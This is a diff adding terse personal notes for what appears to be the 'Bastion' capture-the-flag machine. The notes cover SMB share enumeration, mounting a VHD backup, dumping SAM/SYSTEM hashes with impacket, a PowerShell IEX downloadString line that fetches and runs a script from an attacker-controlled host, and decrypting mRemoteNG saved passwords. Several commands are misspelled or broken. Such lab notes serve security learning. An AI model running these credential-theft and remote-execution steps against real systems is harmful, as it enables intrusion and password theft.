@@ -1,0 +1,17 @@
+.......Bastion........
+-find port 445 open >> smb >> 1- smbclient -l //ip or 2-smbmap -u DoesNotExist -h   >>    list shared files
+-mount -t cifs //ip/target_file location
+-du -he file > size 
+-7z l file.vhd  >> list -x to extract
+-guestmout >> used to mount .vhd file
+-sam / system >> windows/system32/config
+$$$$$ impacket-secrets-dump -sam SAM -system -SYSTEM local (aad and 31d6 means nothing - maybe disable)
+-net localgroup admin >> to list users admins
+- for uploud file to server 
+         -on kali machine >> python -m simplehttpserver -- in file directory
+         -on shell you pwod >> powershell "IEX(New-Object .Net.WebClient).downloadString('http://ip:port/jaws-enum.ps1'"
+-mRemoteNG password crack >> get-clone python script 
+         first > you need to find strings of password >> it in config file
+         config file for user in >> \users\ahmed\ cd . for hidden cd appdata - roaming>mRemoteNG
+         type confCons.xml to cat file  >> search for password 
+         take hash to mremoting_decrpt.py : and done 
